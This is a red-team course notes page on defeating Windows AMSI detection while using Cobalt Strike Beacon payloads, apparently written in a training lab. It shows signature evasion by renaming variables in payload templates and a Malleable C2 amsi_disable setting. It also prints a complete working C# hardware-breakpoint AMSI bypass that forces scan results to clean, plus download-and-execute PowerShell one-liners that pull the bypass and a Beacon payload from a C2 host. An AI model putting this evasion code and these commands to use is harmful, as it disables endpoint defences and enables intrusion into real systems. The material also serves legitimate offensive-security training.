It was designed to tackle ["fileless" malware](https://www.crowdstrike.com/en-us/cybersecurity-101/malware/fileless-malware/) that was so heavily popularised by tools like the [EmpireProject](https://github.com/EmpireProject/Empire), which leveraged PowerShell for complete in-memory C2.

<figure><img src="../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

Any third party application can use AMSI to scan user input for malicious content.

In fact, many Windows components now use AMSI including PowerShell, the Windows Script Host, JavaScript, VBScript, and VBA.

**If we try to execute one of the PowerShell payloads on our attacking machine, it will likely get blocked:**

```
PS C:\Users\Attacker> C:\Payloads\smb_x64.ps1
At C:\Payloads\smb_x64.ps1:1 char:1
+ Set-StrictMode -Version 2
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
```

{% hint style="warning" %}
The alert that Defender produces is tagged with `amsi:` rather than `file:`, indicating that something malicious was detected in memory.
{% endhint %}

<figure><img src="../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

**Also attempting to move laterally to the file server will also fail:**

{% code overflow="wrap" %}
```
beacon> jump winrm64 fs.dev.cyberbotic.io smb
[-] Could not connect to pipe: 2 - ERROR_FILE_NOT_FOUND
[+] received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+  Set-StrictMode -Version 2_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S="Error">    + CategoryInfo          : ParserError: (:) [], ParseException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S="Error">    + PSComputerName        : fs.dev.cyberbotic.io_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
```
{% endcode %}

Even though this is in-memory, the detections are still based on _**known bad**_ signatures.

PowerShell files are a little easier to analyze when compared to binary files.&#x20;

**Scanning it with `ThreatCheck.exe` and the `-e amsi` parameter will reveal the bad strings:**&#x20;

```
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.ps1 -e amsi
[+] Target file size: 358025 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x57450
00000000   4D 6A 49 79 4D 6A 49 79  4D 6A 49 79 4D 6A 49 79   MjIyMjIyMjIyMjIy
00000010   4D 6A 49 79 4D 6A 49 79  4D 6A 49 79 4D 6A 49 79   MjIyMjIyMjIyMjIy
00000020   4D 6A 49 79 4D 6A 49 79  4D 6A 49 79 4D 6A 49 79   MjIyMjIyMjIyMjIy
00000030   4D 6A 49 79 4D 6A 49 79  4D 6A 49 79 4D 6A 49 79   MjIyMjIyMjIyMjIy
00000040   4D 6A 49 79 4D 6A 49 79  4D 6A 49 79 4D 6A 49 79   MjIyMjIyMjIyMjIy
00000050   4D 6A 49 79 4D 6A 49 79  4D 6A 49 79 4D 6A 49 79   MjIyMjIyMjIyMjIy
00000060   4D 6A 49 79 4D 6A 49 79  4D 6A 49 79 4D 6A 49 79   MjIyMjIyMjIyMjIy
00000070   4D 6A 49 79 4D 6A 49 79  4D 6A 49 79 4D 6A 49 79   MjIyMjIyMjIyMjIy
00000080   4D 6A 49 79 4D 6A 49 79  4D 6A 49 79 4D 6A 49 79   MjIyMjIyMjIyMjIy
00000090   4D 6A 49 79 4D 6A 49 79  4D 6A 49 79 4D 6A 49 79   MjIyMjIyMjIyMjIy
000000A0   4D 6A 49 79 4D 6A 49 77  3D 3D 27 29 0A 0A 09 66   MjIyMjIw==')···f
000000B0   6F 72 20 28 24 78 20 3D  20 30 3B 20 24 78 20 2D   or ($x = 0; $x -
000000C0   6C 74 20 24 76 61 72 5F  63 6F 64 65 2E 43 6F 75   lt $var_code.Cou
000000D0   6E 74 3B 20 24 78 2B 2B  29 20 7B 0A 09 24 76 61   nt; $x++) {··$va
000000E0   72 5F 63 6F 64 65 5B 24  78 5D 20 3D 20 24 76 61   r_code[$x] = $va
000000F0   72 5F 63 6F 64 65 5B 24  78 5D 20 2D 62 78 6F 72   r_code[$x] -bxor

[*] Run time: 3.13s
```

{% hint style="success" %}
&#x20; Ensure real-time protection is **enabled** in Defender before running ThreatCheck against script artifacts.
{% endhint %}

**The portion of the output that we want to pay attention to is the loop, which is on lines 26-28 of `smb_x64.ps1`:**

```powershell
for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}
```

**As a quick test, use the&#x20;**_**find/replace**_**&#x20;feature in an IDE such as VSCode to change the `$x` and the `$var_code` variable names to something else:**

```powershell
for ($i = 0; $i -lt $enc.Count; $i++) {
    $enc[$i] = $enc[$i] -bxor 35
}
```

**`ThreatCheck.exe` will now report the payload as clean:**

{% code overflow="wrap" %}
```
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.ps1 -e amsi
[+] No threat found!
[*] Run time: 0.34s
```
{% endcode %}

### Making this Change Permanent Across all PowerShell Payloads

We can modify the relevant template in the _**Resource Kit**_.

Where Artifact Kit was used to modify the binary artifacts; the _**Resource Kit**_ is used to modify the script-based artifacts including the PowerShell, Python, HTA, and VBA payloads.

<mark style="color:yellow;">The</mark> <mark style="color:yellow;"></mark>_<mark style="color:yellow;">**Resource Kit**</mark>_ <mark style="color:yellow;"></mark><mark style="color:yellow;">can be found in</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`C:\Tools\cobaltstrike\arsenal-kit\kits\resource`</mark> and the 64-bit stageless PowerShell payload is generated from `template.x64.ps1`.

**Interestingly, if we check the content, Fortra has already provided different variable names — `$zz` in place of `$x` and `$v_code` in place of `$var_code`:**

```powershell
for ($zz = 0; $zz -lt $v_code.Count; $zz++) {
	$v_code[$zz] = $v_code[$zz] -bxor 35
}
```

**As before, use the included build script and specify an output directory, then load `resources.cna` into Cobalt Strike:**

```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/resource> ./build.sh /mnt/c/Tools/cobaltstrike/resources
[Resource Kit] [+] Copy the resource files
[Resource Kit] [+] Generate the resources.cna from the template file.
[Resource Kit] [+] The resource kit files are saved in '/mnt/c/Tools/cobaltstrike/resources'
```

One common source of confusion is when hosting PowerShell payloads using the **Scripted Web Delivery Method**_. These will typically get caught when your stageless PowerShell payloads do not._

```
PS C:\Users\Attacker> iex (new-object net.webclient).downloadstring("http://10.10.5.50/a")
IEX : At line:1 char:1
+ Set-StrictMode -Version 2
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At line:1 char:304409
+ ... WTtJBgA="));IEX (New-Object IO.StreamReader(New-Object IO.Compression ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

{% hint style="info" %}
The resason for this is that it uses the `compress.ps1` template instead, which decompresses the payload from a `Gzip` stream.&#x20;

AMSI will flag almost _**anything**_ as malicious if it sees a binary file coming out of a `Gzip` stream.

Unless, you have requirement for using a compressed version, in which case you can re-work this template as well, the easiest workaround is to just host your stageless PowerShell payload directly via _**Site Management > Host File**_.
{% endhint %}

<figure><img src="../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

```
PS C:\Users\Attacker> iex (new-object net.webclient).downloadstring("http://10.10.5.50/a2")
```

## AMSI vs Post-Exploitation

The Beacon payload is not the only place AMSI will snatch you, but also in various post-exploitation commands which AMSI can instrument.

To name a few are `powershell`, `powerpick` and `execute-assembly`. This occurs because Beacon will spawn new processes to execute these commands, and each process gets its own copy of AMSI.

```
beacon> run hostname
fs

beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

beacon> powershell Get-Domain
[-] lost link to parent beacon: 10.10.123.102
```

```
beacon> remote-exec winrm fs Get-MpThreatDetection

PSComputerName                 : fs
ProcessName                    : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RemediationTime                : 9/14/2022 5:01:18 PM
Resources                      : {amsi:_\Device\HarddiskVolume1\Windows\System32\WindowsPowerShell\v1.0\powershell.exe}
```

In this case, the Beacon payload spawned `PowerShell.exe` and attempted to `PowerView.ps1` into it.&#x20;

This was detected by AMSI and killed immediately. Defender also goes one step further and kills the process. Defender also goes one step further and kills the process that spawned it (which would be our Beacon), this is why we immediately lose the link to it.

**The same exact thing will happen if we attempt to execute a `.NET` assembly that is&#x20;**_**known**_**&#x20;to Defender:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
[-] Failed to load the assembly w/hr 0x8007000b
[-] lost link to parent beacon: 10.10.123.102
```

```
PSComputerName                 : fs
ProcessName                    : C:\Windows\System32\rundll32.exe
RemediationTime                : 9/14/2022 5:18:35 PM
Resources                      : {amsi:_\Device\HarddiskVolume1\Windows\System32\rundll32.exe}
```

It would be a bit of a pain to modify and obfuscate every single post-ex tool, so Cobalt Strike introduced a configuration that we can apply in Malleable C2 `amsi_disable`.&#x20;

This uses a memory-patching technique which RastaMouse has [blogged about](https://rastamouse.me/memory-patching-amsi-bypass/) before to disable AMSI in the spawned process prior to injecting the post-ex capability.&#x20;

**SSH into the team server and open the profile you're using in a text editor (it is likely `webbug.profile`):**

```
attacker@ubuntu ~/cobaltstrike> vim c2-profiles/normal/webbug.profile
```

**Right above the `http-get` block, add the following:**

```
post-ex {
        set amsi_disable "true";
}
```

**After modifying a profile, it's always a good idea to check it with c2lint to ensure you didn't break anything:**

```
attacker@ubuntu ~/cobaltstrike> ./c2lint c2-profiles/normal/webbug.profile
```

{% hint style="info" %}
Per usual, <mark style="color:yellow;">warnings</mark> are <mark style="color:yellow;">ok</mark>, but <mark style="color:red;">errors</mark> are usually <mark style="color:red;">fatal</mark>.
{% endhint %}

You will need to restart your team server and re-acquire a Beacon on the file server.

**This time, Rubeus will execute:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

   
  v2.1.2 
```

{% hint style="warning" %}
`amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`. &#x20;

It **does not** apply to the powershell command.
{% endhint %}

### But wait, there's more!

However, you'll notice that your Beacon probably still dies shortly thereafter. This brings us to _**behavioural detections**_.

## Manual AMSI Bypasses

You may run into situations where `ThreatCheck.exe` gives the "all clear" on a payload, but it still gets caught.

This is partially troublesome for initial access or lateral movement payloads, because Beacon's `amsi_disable` directive does _**not**_ apply to them.

<figure><img src="../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

**There are two common reasons for this:**

1. The Defender engine/signature versions differ between our attacking workstation and the target.
2. The malicious part of the payload may be buried under one or more layers of execution. `ThreatCheck.exe` can only scan the "top level" of a provided sample, it cannot emulate the layers of execution that will occur inside the PowerShell engine.&#x20;
   1. Below is a sample example to illustrate:

<figure><img src="../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

**The information that `ThreatCheck.exe` submits to AMSI is the literal string:**

```
`[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA")) | iex`
```

This comes back as clean because the content doesn't match any known signatures.  However, when executed, AMSI blocks it because the string `"Invoke-Mimikatz"` is signatured. &#x20;

The difference is that the PowerShell engine will re-scan the content being piped to Invoke-Expression, which is no longer in it's base64 encoded form.  This is a behaviour that ThreatCheck cannot replicate.

**To help get around this, we can integrate an external AMSI bypass into our payloads. For example, this method by** [**@\_EthicalChaos\_**](https://twitter.com/_EthicalChaos_) **(modified by** [**@ShitSecure**](https://twitter.com/ShitSecure)**) which utilises hardware breakpoints:**

```csharp
$HWBP = @"
using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace HWBP
{
    public class Amsi
    {
        static string a = "msi";
        static string b = "anB";
        static string c = "ff";
        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
        
        public static void Bypass()
        {
            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
            ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;

            MethodInfo method = typeof(Amsi).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
            
            Marshal.StructureToPtr(ctx, pCtx, true);
            bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
            ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));

            EnableBreakpoint(ctx, pABuF, 0);
            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
        }
        
        public static long Handler(IntPtr exceptions)
        {
            WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
            ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));

            WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
            ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));

            WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
            ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));

            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
            {
                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);

                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean

                Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

                ContextRecord.Rip = ReturnAddress;
                ContextRecord.Rsp += 8;
                ContextRecord.Rax = 0; // S_OK
                
                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
            }
            else
            {
                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
            }

        }

        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
        {
            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }

            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            ctx.Dr6 = 0;

            Marshal.StructureToPtr(ctx, pCtx, true);
        }

        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }
    }

    public class WinAPI
    {
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
        public const Int32 RIP_EVENT = 9;
        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;

        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        public const UInt32 DBG_CONTROL_C = 0x40010006;
        public const UInt32 DEBUG_PROCESS = 0x00000001;
        public const UInt32 CREATE_SUSPENDED = 0x00000004;
        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;

        public const Int32 AMSI_RESULT_CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}
"@

Add-Type -TypeDefinition $HWBP
[HWBP.Amsi]::Bypass()
```

**We could save this off to a new file and host it at a different URI on the team server.** &#x20;

**Then just call and invoke this bypass script before the payload:**

```
PS C:\Users\bfarmer> iex (new-object net.webclient).downloadstring("http://nickelviper.com/bypass"); iex (new-object net.webclient).downloadstring("http://nickelviper.com/a")
```

## Behavioural Detections

**When dealing with behavioural detections, the Defender alerts look something like this:**

```
PSComputerName                 : fs
ProcessName                    : C:\Windows\System32\rundll32.exe
RemediationTime                : 9/14/2022 5:40:03 PM
Resources                      : {behavior:_pid:4964:111820579542652, 
                                 process:_pid:4040,ProcessStart:133076508002529669, 
                                 process:_pid:4964,ProcessStart:133076507626927382}
```

The Beacon running on the file server is living inside the rundll32 process (PID 4404). &#x20;

When Cobalt Strike runs a post-ex command that uses the [fork & run](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm) pattern, it will spawn a sacrificial process, inject the post-ex capability into it, retrieve the output over a named pipe, and then kill the process.  The primary reason to do this is to ensure that unstable post-ex tools don't crash the Beacon.

<figure><img src="../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

